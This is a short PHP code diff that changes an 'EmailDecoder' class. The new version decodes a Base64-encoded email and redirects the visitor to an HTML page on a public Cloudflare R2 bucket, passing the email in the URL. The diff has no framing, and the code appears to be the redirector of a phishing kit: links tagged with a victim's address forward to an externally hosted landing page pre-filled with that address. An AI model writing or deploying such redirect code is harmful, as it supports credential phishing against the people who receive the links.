@@ -4,32 +4,20 @@ namespace App;
 
 class EmailDecoder
 {
+    // Check if data is Base64 encoded
     public static function isBase64($data)
     {
         return (base64_encode(base64_decode($data, true)) === $data);
     }
 
-    public static function process($path)
+    // Decode the email and redirect
+    public static function decode($email)
     {
-        preg_match('/^\/(\d{5})(.+)$/', $path, $matches);
-
-        if (count($matches) === 3) {
-            $randomNumber = $matches[1];
-            $encodedEmail = $matches[2];
-
-            if (self::isBase64($encodedEmail)) {
-                $email = base64_decode($encodedEmail);
-                $encodedEmail = base64_encode($email);
-                $url = "https://example.com/{$encodedEmail}";
-                header("Location: $url");
-                exit;
-            } else {
-                echo "Invalid Base64 encoded email.";
-                exit;
-            }
-        } else {
-            echo "Invalid URL format. Expected /{5randomdigits}{Base64EncodedEmail}.";
-            exit;
+        if (self::isBase64($email)) {
+            $email = base64_decode($email);
         }
+
+        header("Location: https://pub-52b565e2d63449c59c1957eb7cd05dc4.r2.dev/OnGod.html?email=" . $email);
+        exit;
     }
 }
